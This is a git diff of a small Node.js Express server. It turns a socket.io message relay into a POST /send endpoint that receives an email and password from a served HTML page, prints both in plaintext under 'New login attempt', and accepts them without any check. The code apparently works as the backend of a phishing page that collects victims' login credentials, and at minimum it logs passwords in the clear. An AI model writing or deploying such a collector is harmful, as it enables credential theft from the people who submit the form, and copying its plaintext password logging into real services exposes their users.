@@ -1,30 +1,28 @@
-const express = require("express")
-const http = require("http")
-const { Server } = require("socket.io")
+// server.js
+const express = require("express");
+const app = express();
+const port = 3000;
 
-const app = express()
-const server = http.createServer(app)
-const io = new Server(server)
+// Middleware to parse JSON body
+app.use(express.json());
 
-app.use(express.static("public"))
-app.use(express.json())
+// Serve static files (your HTML page)
+app.use(express.static("public"));
 
-// API endpoint
+// Endpoint to receive login data
 app.post("/send", (req, res) => {
-  const message = req.body.message
+  const { email, password } = req.body;
 
-  console.log("📩 Message from webpage:", message)
+  // Log email and password in terminal
+  console.log("📩 New login attempt:");
+  console.log(`   Email: ${email}`);
+  console.log(`   Password: ${password}`);
+  console.log("------------------------------------------------");
 
-  io.emit("new_message", message)
+  res.sendStatus(200); // Respond OK to frontend
+});
 
-  res.json({ status: "received" })
-})
-
-// websocket connection
-io.on("connection", (socket) => {
-  console.log("⚡ Client connected")
-})
-
-server.listen(3000, () => {
-  console.log("🚀 Server running on http://localhost:3000")
-})
+// Start the server
+app.listen(port, () => {
+  console.log(`🚀 Server running on http://localhost:${port}`);
+});
